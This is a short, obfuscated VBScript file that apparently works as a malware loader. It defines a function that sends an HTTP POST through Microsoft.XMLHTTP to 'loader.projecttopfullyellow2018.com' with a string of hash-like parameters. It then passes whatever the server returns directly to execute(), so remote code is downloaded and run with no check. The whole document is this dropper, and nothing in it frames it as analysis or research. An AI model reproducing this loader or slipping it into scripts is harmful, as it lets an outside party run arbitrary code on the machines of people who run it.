Function vac46c38bd16e(sUrl, sRequest)
  set xaa17bef960b7 = CreateObject("Microsoft.XMLHTTP")
  xaa17bef960b7.open "POST", sUrl,false
  xaa17bef960b7.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  xaa17bef960b7.setRequestHeader "Content-Length", Len(sRequest)
  xaa17bef960b7.send sRequest
  vac46c38bd16e = xaa17bef960b7.responseText
 End Function
aae0b9565 = vac46c38bd16e("http://loader.projecttopfullyellow2018.com/","76cf4ecb943fc5282061fffd96ff4df9=573eec40e4ef4f2089531dd5cbf629f8&5f6371c9126149517d9ba475def53139=6d378765f17a856b7ba8bf1541cafb69&244edd7e85dc81602b7615cd705545f5=c622c085c04eadc473f08541b255320e&b08354f3688c4e4e8c52c207d7d5b8c3=a760880003e7ddedfef56acb3b09697f&400c3241004b5db7ca7f5abfef2794f2=d1f255a373a3cef72e03aa9d980c7eca&f0282b5ff85e7c9c66200d780bd7e72e=c4de8ced6214345614d33fb0b16a8acd&06997f04a7db92466a2baa6ebc8b872d=1b69ebedb522700034547abc5652ffac&a088ea2078cd92b0b8a0e78a32c5c082=97f081d3b1b352e9d1aaa2225dd6bb16&ee1d21306cddf0e43641f1dc52d810be=3e7e0224018ab3cf51abb96464d518cd")
execute(aae0b9565)